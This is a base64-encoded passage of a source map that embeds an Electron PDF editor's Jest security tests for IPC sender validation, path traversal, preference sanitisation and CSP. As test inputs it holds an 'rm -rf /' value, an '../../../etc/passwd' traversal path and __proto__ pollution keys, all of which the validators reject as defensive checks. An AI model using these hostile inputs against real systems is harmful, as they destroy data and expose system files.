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LENBQUMsUUFBUSxDQUFDLE1BQU0sQ0FBQyxRQUFRLENBQUMsQ0FBQztnQkFDbEQsQ0FBQztnQkFBQyxNQUFNLENBQUM7b0JBQ1AsT0FBTyxLQUFLLENBQUM7Z0JBQ2YsQ0FBQztZQUNILENBQUMsQ0FBQztZQUVGLE1BQU0sQ0FBQyxnQkFBZ0IsQ0FBQyw0QkFBNEIsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDO1lBQ2xFLE1BQU0sQ0FBQyxnQkFBZ0IsQ0FBQyx1QkFBdUIsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDO1lBQzdELE1BQU0sQ0FBQyxnQkFBZ0IsQ0FBQyw0QkFBNEIsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDO1lBQ25FLE1BQU0sQ0FBQyxnQkFBZ0IsQ0FBQyxxQkFBcUIsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDO1FBQzlELENBQUMsQ0FBQyxDQUFDO0lBQ0wsQ0FBQyxDQUFDLENBQUM7QUFDTCxDQUFDLENBQUMsQ0FBQyIsIm5hbWVzIjpbXSwic291cmNlcyI6WyJDOlxcVXNlcnNcXEFkbWluXFxEb2N1bWVudHNcXFJTVFxcUERGIEVkaXRvclxcdGVzdHNcXGludGVncmF0aW9uXFxpcGNcXHNlY3VyaXR5LnRlc3QudHMiXSwic291cmNlc0NvbnRlbnQiOlsiLyoqXG4gKiBJUEMgU2VjdXJpdHkgSW50ZWdyYXRpb24gVGVzdHNcbiAqIFRlc3RzIHRoZSBzZWN1cml0eSBvZiBJUEMgY29tbXVuaWNhdGlvbiBiZXR3ZWVuIG1haW4gYW5kIHJlbmRlcmVyIHByb2Nlc3Nlc1xuICovXG5cbmRlc2NyaWJlKCdJUEMgU2VjdXJpdHkgSW50ZWdyYXRpb24gVGVzdHMnLCAoKSA9PiB7XG4gIGxldCBtb2NrTWFpbldpbmRvdzogYW55O1xuICBsZXQgbW9ja0V2ZW50OiBhbnk7XG5cbiAgYmVmb3JlRWFjaCgoKSA9PiB7XG4gICAgbW9ja01haW5XaW5kb3cgPSB7XG4gICAgICBpc0Rlc3Ryb3llZDogamVzdC5mbigpLm1vY2tSZXR1cm5WYWx1ZShmYWxzZSksXG4gICAgICB3ZWJDb250ZW50czoge1xuICAgICAgICBzZW5kOiBqZXN0LmZuKCksXG4gICAgICAgIHNlc3Npb246IHtcbiAgICAgICAgICBjbGVhckNhY2hlOiBqZXN0LmZuKClcbiAgICAgICAgfVxuICAgICAgfVxuICAgIH07XG5cbiAgICBtb2NrRXZlbnQgPSB7XG4gICAgICBzZW5kZXI6IG1vY2tNYWluV2luZG93LndlYkNvbnRlbnRzLFxuICAgICAgc2VuZGVyRnJhbWU6IHtcbiAgICAgICAgdXJsOiAnZmlsZTovLy9hcHAvaW5kZXguaHRtbCdcbiAgICAgIH1cbiAgICB9O1xuICB9KTtcblxuICBkZXNjcmliZSgnU2VuZGVyIFZhbGlkYXRpb24nLCAoKSA9PiB7XG4gICAgaXQoJ3Nob3VsZCByZWplY3QgdW5hdXRob3JpemVkIHNlbmRlcnMnLCAoKSA9PiB7XG4gICAgICBjb25zdCB1bmF1dGhvcml6ZWRFdmVudCA9IHtcbiAgICAgICAgc2VuZGVyOiB7XG4gICAgICAgICAgaXNEZXN0cm95ZWQ6ICgpID0+IGZhbHNlXG4gICAgICAgIH0sXG4gICAgICAgIHNlbmRlckZyYW1lOiB7XG4gICAgICAgICAgdXJsOiAnaHR0cHM6Ly9tYWxpY2lvdXMtc2l0ZS5jb20nXG4gICAgICAgIH1cbiAgICAgIH07XG5cbiAgICAgIC8vIFRoaXMgd291bGQgYmUgdGhlIGFjdHVhbCB2YWxpZGF0aW9uIGZ1bmN0aW9uIGZyb20gbWFpbi5qc1xuICAgICAgY29uc3QgdmFsaWRhdGVTZW5kZXIgPSAoZXZlbnQ6IGFueSkgPT4ge1xuICAgICAgICBpZiAoZXZlbnQuc2VuZGVyRnJhbWUpIHtcbiAgICAgICAgICBjb25zdCB1cmwgPSBuZXcgVVJMKGV2ZW50LnNlbmRlckZyYW1lLnVybCk7XG4gICAgICAgICAgY29uc3QgYWxsb3dlZE9yaWdpbnMgPSBbJ2ZpbGU6JywgJ2h0dHA6Ly9sb2NhbGhvc3Q6ODA4MCddO1xuICAgICAgICAgIGNvbnN0IGlzQWxsb3dlZCA9IGFsbG93ZWRPcmlnaW5zLnNvbWUob3JpZ2luID0+IFxuICAgICAgICAgICAgdXJsLnByb3RvY29sID09PSBvcmlnaW4gfHwgdXJsLm9yaWdpbiA9PT0gb3JpZ2luXG4gICAgICAgICAgKTtcbiAgICAgICAgICBpZiAoIWlzQWxsb3dlZCkge1xuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdVbmF1dGhvcml6ZWQgb3JpZ2luJyk7XG4gICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICB9O1xuXG4gICAgICBleHBlY3QoKCkgPT4gdmFsaWRhdGVTZW5kZXIodW5hdXRob3JpemVkRXZlbnQpKS50b1Rocm93KCdVbmF1dGhvcml6ZWQgb3JpZ2luJyk7XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIGFjY2VwdCBhdXRob3JpemVkIGxvY2FsaG9zdCBvcmlnaW5zJywgKCkgPT4ge1xuICAgICAgY29uc3QgZGV2RXZlbnQgPSB7XG4gICAgICAgIHNlbmRlcjogbW9ja01haW5XaW5kb3cud2ViQ29udGVudHMsXG4gICAgICAgIHNlbmRlckZyYW1lOiB7XG4gICAgICAgICAgdXJsOiAnaHR0cDovL2xvY2FsaG9zdDo4MDgwL2luZGV4Lmh0bWwnXG4gICAgICAgIH1cbiAgICAgIH07XG5cbiAgICAgIGNvbnN0IHZhbGlkYXRlU2VuZGVyID0gKGV2ZW50OiBhbnkpID0+IHtcbiAgICAgICAgaWYgKGV2ZW50LnNlbmRlckZyYW1lKSB7XG4gICAgICAgICAgY29uc3QgdXJsID0gbmV3IFVSTChldmVudC5zZW5kZXJGcmFtZS51cmwpO1xuICAgICAgICAgIGNvbnN0IGFsbG93ZWRPcmlnaW5zID0gWydmaWxlOicsICdodHRwOi8vbG9jYWxob3N0OjgwODAnXTtcbiAgICAgICAgICBjb25zdCBpc0FsbG93ZWQgPSBhbGxvd2VkT3JpZ2lucy5zb21lKG9yaWdpbiA9PiBcbiAgICAgICAgICAgIHVybC5wcm90b2NvbCA9PT0gb3JpZ2luIHx8IHVybC5vcmlnaW4gPT09IG9yaWdpblxuICAgICAgICAgICk7XG4gICAgICAgICAgaWYgKCFpc0FsbG93ZWQpIHtcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignVW5hdXRob3JpemVkIG9yaWdpbicpO1xuICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgfTtcblxuICAgICAgZXhwZWN0KCgpID0+IHZhbGlkYXRlU2VuZGVyKGRldkV2ZW50KSkubm90LnRvVGhyb3coKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgYWNjZXB0IGZpbGUgcHJvdG9jb2wgb3JpZ2lucycsICgpID0+IHtcbiAgICAgIGNvbnN0IGZpbGVFdmVudCA9IHtcbiAgICAgICAgc2VuZGVyOiBtb2NrTWFpbldpbmRvdy53ZWJDb250ZW50cyxcbiAgICAgICAgc2VuZGVyRnJhbWU6IHtcbiAgICAgICAgICB1cmw6ICdmaWxlOi8vL2FwcC9kaXN0L2luZGV4Lmh0bWwnXG4gICAgICAgIH1cbiAgICAgIH07XG5cbiAgICAgIGNvbnN0IHZhbGlkYXRlU2VuZGVyID0gKGV2ZW50OiBhbnkpID0+IHtcbiAgICAgICAgaWYgKGV2ZW50LnNlbmRlckZyYW1lKSB7XG4gICAgICAgICAgY29uc3QgdXJsID0gbmV3IFVSTChldmVudC5zZW5kZXJGcmFtZS51cmwpO1xuICAgICAgICAgIGNvbnN0IGFsbG93ZWRPcmlnaW5zID0gWydmaWxlOicsICdodHRwOi8vbG9jYWxob3N0OjgwODAnXTtcbiAgICAgICAgICBjb25zdCBpc0FsbG93ZWQgPSBhbGxvd2VkT3JpZ2lucy5zb21lKG9yaWdpbiA9PiBcbiAgICAgICAgICAgIHVybC5wcm90b2NvbCA9PT0gb3JpZ2luIHx8IHVybC5vcmlnaW4gPT09IG9yaWdpblxuICAgICAgICAgICk7XG4gICAgICAgICAgaWYgKCFpc0FsbG93ZWQpIHtcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignVW5hdXRob3JpemVkIG9yaWdpbicpO1xuICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgfTtcblxuICAgICAgZXhwZWN0KCgpID0+IHZhbGlkYXRlU2VuZGVyKGZpbGVFdmVudCkpLm5vdC50b1Rocm93KCk7XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdJUEMgSGFuZGxlciBJbnB1dCBWYWxpZGF0aW9uJywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgdmFsaWRhdGUgZmlsZSBwYXRocyBpbiBzYXZlLWZpbGUgaGFuZGxlcicsICgpID0+IHtcbiAgICAgIGNvbnN0IHZhbGlkYXRlRmlsZVBhdGggPSAoZmlsZVBhdGg6IHN0cmluZykgPT4ge1xuICAgICAgICBpZiAoIWZpbGVQYXRoIHx8IHR5cGVvZiBmaWxlUGF0aCAhPT0gJ3N0cmluZycpIHtcbiAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0ludmFsaWQgZmlsZSBwYXRoJyk7XG4gICAgICAgIH1cbiAgICAgICAgXG4gICAgICAgIGlmIChmaWxlUGF0aC5sZW5ndGggPiAyNjApIHtcbiAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0ZpbGUgcGF0aCB0b28gbG9uZycpO1xuICAgICAgICB9XG4gICAgICAgIFxuICAgICAgICBpZiAoZmlsZVBhdGguaW5jbHVkZXMoJy4uJykgfHwgZmlsZVBhdGguaW5jbHVkZXMoJ34nKSkge1xuICAgICAgICAgIHRocm93IG5ldyBFcnJvcignSW52YWxpZCBmaWxlIHBhdGggLSBwYXRoIHRyYXZlcnNhbCBkZXRlY3RlZCcpO1xuICAgICAgICB9XG4gICAgICAgIFxuICAgICAgICByZXR1cm4gZmlsZVBhdGg7XG4gICAgICB9O1xuXG4gICAgICAvLyBUZXN0IHBhdGggdHJhdmVyc2FsIHByZXZlbnRpb25cbiAgICAgIGV4cGVjdCgoKSA9PiB2YWxpZGF0ZUZpbGVQYXRoKCcuLi8uLi8uLi9ldGMvcGFzc3dkJykpLnRvVGhyb3coJ3BhdGggdHJhdmVyc2FsJyk7XG4gICAgICBleHBlY3QoKCkgPT4gdmFsaWRhdGVGaWxlUGF0aCgnQzpcXFxcLi5cXFxcd2luZG93c1xcXFxzeXN0ZW0zMicpKS50b1Rocm93KCdwYXRoIHRyYXZlcnNhbCcpO1xuICAgICAgXG4gICAgICAvLyBUZXN0IHZhbGlkIHBhdGhzXG4gICAgICBleHBlY3QoKCkgPT4gdmFsaWRhdGVGaWxlUGF0aCgnQzpcXFxcRG9jdW1lbnRzXFxcXGZpbGUucGRmJykpLm5vdC50b1Rocm93KCk7XG4gICAgICBleHBlY3QoKCkgPT4gdmFsaWRhdGVGaWxlUGF0aCgnL2hvbWUvdXNlci9kb2N1bWVudC5wZGYnKSkubm90LnRvVGhyb3coKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdmFsaWRhdGUgZmlsZSBkYXRhIHNpemUgbGltaXRzJywgKCkgPT4ge1xuICAgICAgY29uc3QgdmFsaWRhdGVGaWxlRGF0YSA9IChkYXRhOiBhbnkpID0+IHtcbiAgICAgICAgaWYgKCFkYXRhKSB7XG4gICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdObyBmaWxlIGRhdGEgcHJvdmlkZWQnKTtcbiAgICAgICAgfVxuICAgICAgICBcbiAgICAgICAgaWYgKGRhdGEuYnl0ZUxlbmd0aCA+IDEwMCAqIDEwMjQgKiAxMDI0KSB7XG4gICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdGaWxlIHRvbyBsYXJnZSAobWF4IDEwME1CKScpO1xuICAgICAgICB9XG4gICAgICAgIFxuICAgICAgICByZXR1cm4gZGF0YTtcbiAgICAgIH07XG5cbiAgICAgIGNvbnN0IGxhcmdlRGF0YSA9IHsgYnl0ZUxlbmd0aDogMjAwICogMTAyNCAqIDEwMjQgfTtcbiAgICAgIGV4cGVjdCgoKSA9PiB2YWxpZGF0ZUZpbGVEYXRhKGxhcmdlRGF0YSkpLnRvVGhyb3coJ0ZpbGUgdG9vIGxhcmdlJyk7XG4gICAgICBcbiAgICAgIGNvbnN0IHZhbGlkRGF0YSA9IHsgYnl0ZUxlbmd0aDogNTAgKiAxMDI0ICogMTAyNCB9O1xuICAgICAgZXhwZWN0KCgpID0+IHZhbGlkYXRlRmlsZURhdGEodmFsaWREYXRhKSkubm90LnRvVGhyb3coKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgc2FuaXRpemUgcHJlZmVyZW5jZXMgaW5wdXQnLCAoKSA9PiB7XG4gICAgICBjb25zdCB2YWxpZGF0ZVByZWZlcmVuY2VzID0gKHByZWZzOiBhbnkpID0+IHtcbiAgICAgICAgaWYgKCFwcmVmcyB8fCB0eXBlb2YgcHJlZnMgIT09ICdvYmplY3QnIHx8IEFycmF5LmlzQXJyYXkocHJlZnMpKSB7XG4gICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdJbnZhbGlkIHByZWZlcmVuY2VzIG9iamVjdCcpO1xuICAgICAgICB9XG4gICAgICAgIFxuICAgICAgICBjb25zdCBhbGxvd2VkS2V5cyA9IFsndGhlbWUnLCAnZGVmYXVsdFpvb20nLCAnc2hvd1RodW1ibmFpbHMnLCAnYXV0b1NhdmUnLCAnYXV0b1NhdmVJbnRlcnZhbCddO1xuICAgICAgICBjb25zdCB2YWxpZGF0ZWRQcmVmczogYW55ID0ge307XG4gICAgICAgIFxuICAgICAgICBmb3IgKGNvbnN0IFtrZXksIHZhbHVlXSBvZiBPYmplY3QuZW50cmllcyhwcmVmcykpIHtcbiAgICAgICAgICBpZiAoYWxsb3dlZEtleXMuaW5jbHVkZXMoa2V5KSkge1xuICAgICAgICAgICAgdmFsaWRhdGVkUHJlZnNba2V5XSA9IHZhbHVlO1xuICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICBcbiAgICAgICAgcmV0dXJuIHZhbGlkYXRlZFByZWZzO1xuICAgICAgfTtcblxuICAgICAgY29uc3QgbWFsaWNpb3VzUHJlZnMgPSB7XG4gICAgICAgIHRoZW1lOiAnZGFyaycsXG4gICAgICAgIGV4ZWM6ICdybSAtcmYgLycsXG4gICAgICAgIF9fcHJvdG9fXzogeyBtYWxpY2lvdXM6IHRydWUgfSxcbiAgICAgICAgY29uc3RydWN0b3I6IHsgbmFtZTogJ2hhY2snIH1cbiAgICAgIH07XG5cbiAgICAgIGNvbnN0IHJlc3VsdCA9IHZhbGlkYXRlUHJlZmVyZW5jZXMobWFsaWNpb3VzUHJlZnMpO1xuICAgICAgZXhwZWN0KHJlc3VsdC50aGVtZSkudG9CZSgnZGFyaycpO1xuICAgICAgZXhwZWN0KHJlc3VsdC5leGVjKS50b0JlVW5kZWZpbmVkKCk7XG4gICAgICBleHBlY3QocmVzdWx0Ll9fcHJvdG9fXykudG9CZVVuZGVmaW5lZCgpO1xuICAgICAgZXhwZWN0KHJlc3VsdC5jb25zdHJ1Y3RvcikudG9CZVVuZGVmaW5lZCgpO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnQ29udGV4dCBJc29sYXRpb24nLCAoKSA9PiB7XG4gICAgaXQoJ3Nob3VsZCB2ZXJpZnkgY29udGV4dCBpc29sYXRpb24gaXMgZW5hYmxlZCcsICgpID0+IHtcbiAgICAgIC8vIFRoaXMgd291bGQgYmUgY2hlY2tlZCBpbiB0aGUgYWN0dWFsIHdpbmRvdyBjb25maWd1cmF0aW9uXG4gICAgICBjb25zdCB3aW5kb3dDb25maWcgPSB7XG4gICAgICAgIHdlYlByZWZlcmVuY2VzOiB7XG4gICAgICAgICAgY29udGV4dElzb2xhdGlvbjogdHJ1ZSxcbiAgICAgICAgICBub2RlSW50ZWdyYXRpb246IGZhbHNlLFxuICAgICAgICAgIHNhbmRib3g6IHRydWUsXG4gICAgICAgICAgd2ViU2VjdXJpdHk6IHRydWVcbiAgICAgICAgfVxuICAgICAgfTtcblxuICAgICAgZXhwZWN0KHdpbmRvd0NvbmZpZy53ZWJQcmVmZXJlbmNlcy5jb250ZXh0SXNvbGF0aW9uKS50b0JlKHRydWUpO1xuICAgICAgZXhwZWN0KHdpbmRvd0NvbmZpZy53ZWJQcmVmZXJlbmNlcy5ub2RlSW50ZWdyYXRpb24pLnRvQmUoZmFsc2UpO1xuICAgICAgZXhwZWN0KHdpbmRvd0NvbmZpZy53ZWJQcmVmZXJlbmNlcy5zYW5kYm94KS50b0JlKHRydWUpO1xuICAgICAgZXhwZWN0KHdpbmRvd0NvbmZpZy53ZWJQcmVmZXJlbmNlcy53ZWJTZWN1cml0eSkudG9CZSh0cnVlKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgZW5zdXJlIG5vIGRpcmVjdCBOb2RlLmpzIGFjY2VzcyBpbiByZW5kZXJlcicsICgpID0+IHtcbiAgICAgIC8vIEluIGEgcmVhbCB0ZXN0IGVudmlyb25tZW50LCB0aGlzIHdvdWxkIHZlcmlmeSB0aGF0IHJlbmRlcmVyXG4gICAgICAvLyBjYW5ub3QgYWNjZXNzIE5vZGUuanMgQVBJcyBkaXJlY3RseVxuICAgICAgY29uc3QgbW9ja1JlbmRlcmVyR2xvYmFsID0ge1xuICAgICAgICBwcm9jZXNzOiB1bmRlZmluZWQsXG4gICAgICAgIHJlcXVpcmU6IHVuZGVmaW5lZCxcbiAgICAgICAgbW9kdWxlOiB1bmRlZmluZWQsXG4gICAgICAgIF9fZGlybmFtZTogdW5kZWZpbmVkLFxuICAgICAgICBfX2ZpbGVuYW1lOiB1bmRlZmluZWRcbiAgICAgIH07XG5cbiAgICAgIGV4cGVjdChtb2NrUmVuZGVyZXJHbG9iYWwucHJvY2VzcykudG9CZVVuZGVmaW5lZCgpO1xuICAgICAgZXhwZWN0KG1vY2tSZW5kZXJlckdsb2JhbC5yZXF1aXJlKS50b0JlVW5kZWZpbmVkKCk7XG4gICAgICBleHBlY3QobW9ja1JlbmRlcmVyR2xvYmFsLm1vZHVsZSkudG9CZVVuZGVmaW5lZCgpO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnQ29udGVudCBTZWN1cml0eSBQb2xpY3knLCAoKSA9PiB7XG4gICAgaXQoJ3Nob3VsZCBlbmZvcmNlIHN0cmljdCBDU1AgaGVhZGVycycsICgpID0+IHtcbiAgICAgIGNvbnN0IGNzcFJ1bGVzID0gW1xuICAgICAgICBcImRlZmF1bHQtc3JjICdzZWxmJ1wiLFxuICAgICAgICBcInNjcmlwdC1zcmMgJ3NlbGYnICd1bnNhZmUtaW5saW5lJ1wiLCBcbiAgICAgICAgXCJzdHlsZS1zcmMgJ3NlbGYnICd1bnNhZmUtaW5saW5lJ1wiLFxuICAgICAgICBcImltZy1zcmMgJ3NlbGYnIGRhdGE6IGJsb2I6XCIsXG4gICAgICAgIFwiZm9udC1zcmMgJ3NlbGYnIGRhdGE6XCIsXG4gICAgICAgIFwiY29ubmVjdC1zcmMgJ3NlbGYnXCIsXG4gICAgICAgIFwibWVkaWEtc3JjICdub25lJ1wiLFxuICAgICAgICBcIm9iamVjdC1zcmMgJ25vbmUnXCIsXG4gICAgICAgIFwiZnJhbWUtc3JjICdub25lJ1wiLFxuICAgICAgICBcIndvcmtlci1zcmMgJ3NlbGYnXCIsXG4gICAgICAgIFwiZm9ybS1hY3Rpb24gJ25vbmUnXCIsXG4gICAgICAgIFwiZnJhbWUtYW5jZXN0b3JzICdub25lJ1wiLFxuICAgICAgICBcImJhc2UtdXJpICdzZWxmJ1wiLFxuICAgICAgICBcIm1hbmlmZXN0LXNyYyAnc2VsZidcIlxuICAgICAgXTtcblxuICAgICAgY29uc3QgY3NwID0gY3NwUnVsZXMuam9pbignICcpO1xuICAgICAgXG4gICAgICBleHBlY3QoY3NwKS50b0NvbnRhaW4oXCJkZWZhdWx0LXNyYyAnc2VsZidcIik7XG4gICAgICBleHBlY3QoY3NwKS50b0NvbnRhaW4oXCJvYmplY3Qtc3JjICdub25lJ1wiKTtcbiAgICAgIGV4cGVjdChjc3ApLnRvQ29udGFpbihcImZyYW1lLXNyYyAnbm9uZSdcIik7XG4gICAgICBleHBlY3QoY3NwKS50b0NvbnRhaW4oXCJmb3JtLWFjdGlvbiAnbm9uZSdcIik7XG4gICAgICBleHBlY3QoY3NwKS5ub3QudG9Db250YWluKFwiJ3Vuc2FmZS1ldmFsJ1wiKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdmFsaWRhdGUgQ1NQIGNvbXBsaWFuY2UnLCAoKSA9PiB7XG4gICAgICBjb25zdCB2YWxpZGF0ZUNTUCA9IChjc3A6IHN0cmluZykgPT4ge1xuICAgICAgICBjb25zdCBkYW5nZXJvdXNEaXJlY3RpdmVzID0gW1xuICAgICAgICAgIFwiJ3Vuc2FmZS1ldmFsJ1wiLFxuICAgICAgICAgIFwiZGF0YTogc2NyaXB0LXNyY1wiLFxuICAgICAgICAgIFwiKiBvYmplY3Qtc3JjXCIsXG4gICAgICAgICAgXCIndW5zYWZlLWlubGluZScgc2NyaXB0LXNyY1wiXG4gICAgICAgIF07XG5cbiAgICAgICAgZm9yIChjb25zdCBkYW5nZXJvdXMgb2YgZGFuZ2Vyb3VzRGlyZWN0aXZlcykge1xuICAgICAgICAgIGlmIChjc3AuaW5jbHVkZXMoZGFuZ2Vyb3VzKSkge1xuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xuICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gdHJ1ZTtcbiAgICAgIH07XG5cbiAgICAgIGNvbnN0IHNhZmVDc3AgPSBcImRlZmF1bHQtc3JjICdzZWxmJzsgc2NyaXB0LXNyYyAnc2VsZic7IG9iamVjdC1zcmMgJ25vbmUnXCI7XG4gICAgICBjb25zdCB1bnNhZmVDc3AgPSBcImRlZmF1bHQtc3JjICo7IHNjcmlwdC1zcmMgJ3Vuc2FmZS1ldmFsJ1wi